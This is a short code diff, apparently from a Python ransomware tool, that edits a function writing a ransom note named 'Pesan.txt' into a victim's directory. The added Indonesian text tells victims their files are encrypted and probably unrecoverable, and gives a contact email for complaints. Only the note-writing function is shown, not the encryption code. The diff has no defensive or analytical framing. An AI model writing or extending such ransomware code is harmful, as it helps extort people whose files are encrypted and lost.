@@ -85,7 +85,13 @@ def save_mapping(mapping, map_path):
 def leave_note(target_dir, device_id):
     note_path = os.path.join(target_dir, "Pesan.txt")
     note_content = f"""
-Hai, semua file Anda telah dienkripsi.
+Hai, semua file Anda telah dienkripsi, Kemungkinan tidak dapat di kembalikan lagi seperti semula. Gok Gok Gok Gok Gok Gok Gok
+
+kirim pesan ke email
+
+"MyBion@proton.me"
+
+jika filenya jika ingin komplen, 
 """
     with open(note_path, 'w') as f:
         f.write(note_content)
